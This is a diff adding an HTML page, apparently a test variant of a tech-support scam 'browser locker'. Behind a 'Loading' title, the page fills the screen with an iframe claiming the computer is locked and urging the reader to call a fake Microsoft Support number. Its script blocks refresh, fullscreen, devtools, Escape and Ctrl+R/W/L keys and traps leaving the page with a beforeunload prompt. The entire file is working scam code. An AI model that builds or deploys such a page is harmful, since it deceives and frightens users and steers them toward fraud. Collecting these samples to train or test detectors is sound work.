@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<!-- Variant: content written with document.write into a full-viewport about:blank iframe (no URL at all for the frame). -->
+<html lang="en"><head><meta charset="utf-8"><title>Loading</title>
+<style>html,body{margin:0;height:100%;overflow:hidden}iframe{position:fixed;inset:0;width:100vw;height:100vh;border:0}</style></head>
+<body>
+<iframe id="f"></iframe>
+<script>
+  const d = document.getElementById('f').contentDocument;
+  d.open();
+  d.write(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Alert</title>
+  <style>body{margin:0;background:#002bff;color:#fff;font-family:Arial;height:100vh;display:flex;align-items:center;justify-content:center;text-align:center}</style></head>
+  <body><div><h1>Your computer has been locked</h1><p>Call Microsoft Support immediately: 1-800-555-0166</p></div>
+  <script>
+    document.addEventListener('keydown', e => { if (['F5','F11','F12','Escape'].includes(e.key) || (e.ctrlKey && 'rwl'.includes(e.key.toLowerCase()))) e.preventDefault(); });
+    window.addEventListener('beforeunload', e => { e.preventDefault(); e.returnValue = ''; });
+  <\/script></body></html>`);
+  d.close();
+</script></body></html>
